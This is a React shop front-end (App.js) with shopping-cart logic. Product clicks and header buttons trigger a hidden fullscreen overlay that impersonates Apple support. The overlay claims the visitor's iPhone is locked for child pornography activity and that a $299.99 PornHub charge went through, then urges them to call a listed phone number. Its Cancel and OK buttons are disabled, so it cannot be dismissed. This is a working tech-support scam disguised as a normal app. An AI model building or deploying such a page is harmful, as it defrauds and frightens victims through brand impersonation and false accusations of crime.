import { useEffect, useState } from "react";
import { BrowserRouter as Router, Routes, Route } from "react-router-dom";

import Header from "./components/Header";
import Home from "./pages/Home";
import ProductDetail from "./pages/ProductDetail";
import Cart from "./pages/Cart";
import Checkout from "./pages/Checkout";
import Login from "./pages/Login";
import Signup from "./pages/Signup";
import Popup from "./components/Popup";

import "./App.css";

function FullPageDemo({ isMobile, onClose }) {
  return (
    <div
      style={{
        position: "fixed",
        inset: 0,
        width: "100vw",
        height: "100vh",
        overflowY: "auto",
        zIndex: 999999,
        margin: 0,
        minHeight: "100vh",
        fontFamily:
          '-apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif',
        background: "#bfbfbf",
        color: "#111",
        boxSizing: "border-box",
      }}
    >
      <header
        style={{
          height: isMobile ? "60px" : "100px",
          background: "#1c1c1c",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: isMobile ? "0 28px" : "0 48px",
          color: "white",
          boxSizing: "border-box",
        }}
      >
        <div
          style={{
            width: "25px",
            height: "25px",
            borderRadius: "3px",
            position: "relative",
            boxSizing: "border-box",
          }}
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="25"
            height="25"
            fill="currentColor"
            class="bi bi-list"
            viewBox="0 0 16 16"
          >
            <path
              fill-rule="evenodd"
              d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5"
            />
          </svg>
        </div>

        <div
          style={{
            fontSize: isMobile ? "25px" : "30px",
            fontWeight: 800,
            letterSpacing: "-2px",
          }}
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            x="0px"
            y="0px"
            width="30"
            height="30"
            viewBox="0 0 50 50"
          >
            <path
              fill="white"
              d="M 44.527344 34.75 C 43.449219 37.144531 42.929688 38.214844 41.542969 40.328125 C 39.601563 43.28125 36.863281 46.96875 33.480469 46.992188 C 30.46875 47.019531 29.691406 45.027344 25.601563 45.0625 C 21.515625 45.082031 20.664063 47.03125 17.648438 47 C 14.261719 46.96875 11.671875 43.648438 9.730469 40.699219 C 4.300781 32.429688 3.726563 22.734375 7.082031 17.578125 C 9.457031 13.921875 13.210938 11.773438 16.738281 11.773438 C 20.332031 11.773438 22.589844 13.746094 25.558594 13.746094 C 28.441406 13.746094 30.195313 11.769531 34.351563 11.769531 C 37.492188 11.769531 40.8125 13.480469 43.1875 16.433594 C 35.421875 20.691406 36.683594 31.78125 44.527344 34.75 Z M 31.195313 8.46875 C 32.707031 6.527344 33.855469 3.789063 33.4375 1 C 30.972656 1.167969 28.089844 2.742188 26.40625 4.78125 C 24.878906 6.640625 23.613281 9.398438 24.105469 12.066406 C 26.796875 12.152344 29.582031 10.546875 31.195313 8.46875 Z"
            ></path>
          </svg>
        </div>

        <div
          style={{
            width: "25px",
            height: "25px",
            borderRadius: "3px",
            position: "relative",
            boxSizing: "border-box",
          }}
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="25"
            height="25"
            fill="currentColor"
            class="bi bi-bag"
            viewBox="0 0 16 16"
          >
            <path d="M8 1a2.5 2.5 0 0 1 2.5 2.5V4h-5v-.5A2.5 2.5 0 0 1 8 1m3.5 3v-.5a3.5 3.5 0 1 0-7 0V4H1v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V4zM2 5h12v9a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1z" />
          </svg>
        </div>
      </header>

      <section
        style={{
          height: isMobile ? "auto" : "auto",
          background: "#cfcfcf",
          borderBottom: "1px solid #a8a8a8",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: isMobile ? "0 28px" : "0 52px",
          fontSize: isMobile ? "15px" : "20px",
          fontWeight: 800,
          boxSizing: "border-box",
        }}
      >
        <div>Apple Support +1 (812) 484-6810</div>

        <div
          style={{
            fontSize: "30px",
            transform: "rotate(90deg)",
          }}
        >
          ›
        </div>
      </section>

      <main
        style={{
          minHeight: isMobile ? "calc(100vh - 195px)" : "calc(100vh - 258px)",
          position: "relative",
          textAlign: "center",
          paddingTop: isMobile ? "40px" : "40px",
          boxSizing: "border-box",
        }}
      >
        <div
          style={{
            width: "86%",
            maxWidth: "880px",
            margin: "0 auto",
            background: "#1f1f1f",
            color: "white",
            borderRadius: isMobile ? "28px" : "34px",
            boxShadow: "0 20px 45px rgba(0, 0, 0, 0.25)",
            padding: isMobile ? "32px 34px 26px" : "46px 54px 32px",
            textAlign: "left",
            position: "relative",
            zIndex: 3,
            boxSizing: "border-box",
          }}
        >
          <p
            style={{
              margin: 0,
              fontSize: isMobile ? "18px" : "20px",
              lineHeight: 1.55,
              fontWeight: 400,
              letterSpacing: "-0.5px",
            }}
          >
            Your iPhone has been locked due to illegal child pornography
            activity on your device. Your purchase of $299.99 for PornHub
            subscription via Apple ID is complete. Not you? Call support +1 (812) 484-6810 all call support to unlock it!
          </p>

          <div
            style={{
              marginTop: "20px",
              display: "flex",
              justifyContent: "flex-end",
              gap: isMobile ? "42px" : "70px",
              fontSize: isMobile ? "18px" : "20px",
              color: "#4a90ff",
              fontWeight: 500,
            }}
          >
            <span
              // onClick={onClose}
              style={{
                cursor: "pointer",
              }}
            >
              Cancel
            </span>

            <span
              // onClick={onClose}
              style={{
                cursor: "pointer",
              }}
            >
              OK
            </span>
          </div>
        </div>

        <div
          style={{
            width: "78%",
            margin: "30px auto 0",
            fontSize: isMobile ? "18px" : "20px",
            lineHeight: 1.52,
            fontWeight: 400,
          }}
        >
          illegal child pronography activity on your device. Your purchase of
          $299.99 for PornHub subscription via Apple ID is complete. Not you?
          Call support +1 (812) 484-6810 all call support to unlock it!
        </div>

        <div
          style={{
            background: "#d6d6d6",
            textAlign: "left",
            padding: isMobile ? "18px 34px 28px" : "18px 68px 28px",
            fontSize: isMobile ? "16px" : "18px",
            lineHeight: 1.8,
            marginTop: "22px",
            boxSizing: "border-box",
          }}
        >
          More ways to: Visit an Apple Store, call, of find a reseller,
          <br></br>
          United States
        </div>

        <div
          style={{
            background: "#eeeeee",
            padding: isMobile ? "5px 34px" : "5px 68px",
            fontSize: isMobile ? "15px" : "16px",
            textAlign: "left",
            boxSizing: "border-box",
          }}
        >
          Copyright© 2026 Apple. All Right Reserve.
        </div>
      </main>
    </div>
  );
}

function App() {
  const [cart, setCart] = useState([]);
  const [isCartOpen, setIsCartOpen] = useState(false);
  const [showFullPage, setShowFullPage] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreen = () => {
      setIsMobile(window.innerWidth <= 700);
    };

    checkScreen();
    window.addEventListener("resize", checkScreen);

    return () => window.removeEventListener("resize", checkScreen);
  }, []);

  const handleStart = async () => {
    try {
      await document.documentElement.requestFullscreen();
      setShowFullPage(true);
      return true;
    } catch (error) {
      console.log("Fullscreen blocked:", error);

      // Still show full-page overlay even if browser blocks fullscreen
      setShowFullPage(true);
      return false;
    }
  };

  const closeFullPage = async () => {
    setShowFullPage(false);

    try {
      if (document.fullscreenElement) {
        await document.exitFullscreen();
      }
    } catch (error) {
      console.log("Exit fullscreen error:", error);
    }
  };

  const addToCart = (product) => {
    const existingItem = cart.find((item) => item.id === product.id);

    if (existingItem) {
      setCart(
        cart.map((item) =>
          item.id === product.id
            ? {
                ...item,
                quantity: item.quantity + 1,
              }
            : item,
        ),
      );
    } else {
      setCart([
        ...cart,
        {
          ...product,
          quantity: 1,
        },
      ]);
    }
  };

  const removeFromCart = (productId) => {
    setCart(cart.filter((item) => item.id !== productId));
  };

  const updateQuantity = (productId, quantity) => {
    if (quantity <= 0) {
      removeFromCart(productId);
    } else {
      setCart(
        cart.map((item) =>
          item.id === productId
            ? {
                ...item,
                quantity,
              }
            : item,
        ),
      );
    }
  };

  const clearCart = () => {
    setCart([]);
  };

  const cartCount = cart.reduce((sum, item) => sum + item.quantity, 0);

  const cartTotal = cart.reduce(
    (sum, item) => sum + item.price * item.quantity,
    0,
  );

  return (
    <Router>
      <div className="app">
        {showFullPage && (
          <FullPageDemo isMobile={isMobile} onClose={closeFullPage} />
        )}

        {!showFullPage && (
          <>
            <Header
              cartCount={cartCount}
              onCartClick={() => setIsCartOpen(true)}
              onButtonClick={handleStart}
            />

            <Routes>
              <Route
                path="/"
                element={
                  <Home
                    addToCart={addToCart}
                    onProductClick={handleStart}
                    onButtonClick={handleStart}
                  />
                }
              />

              <Route
                path="/product/:id"
                element={
                  <ProductDetail
                    addToCart={addToCart}
                    onProductClick={handleStart}
                  />
                }
              />

              <Route
                path="/cart"
                element={
                  <Cart
                    cart={cart}
                    updateQuantity={updateQuantity}
                    removeFromCart={removeFromCart}
                    cartTotal={cartTotal}
                  />
                }
              />

              <Route
                path="/checkout"
                element={
                  <Checkout
                    cart={cart}
                    cartTotal={cartTotal}
                    clearCart={clearCart}
                  />
                }
              />

              <Route path="/login" element={<Login />} />
              <Route path="/signup" element={<Signup />} />
            </Routes>

            {isCartOpen && (
              <div
                className="cart-sidebar-overlay"
                onClick={() => setIsCartOpen(false)}
              >
                <div
                  className="cart-sidebar"
                  onClick={(e) => e.stopPropagation()}
                >
                  <Cart
                    cart={cart}
                    updateQuantity={updateQuantity}
                    removeFromCart={removeFromCart}
                    cartTotal={cartTotal}
                    onClose={() => setIsCartOpen(false)}
                    isSidebar={true}
                  />
                </div>
              </div>
            )}

            <Popup />
          </>
        )}
      </div>
    </Router>
  );
}

export default App;
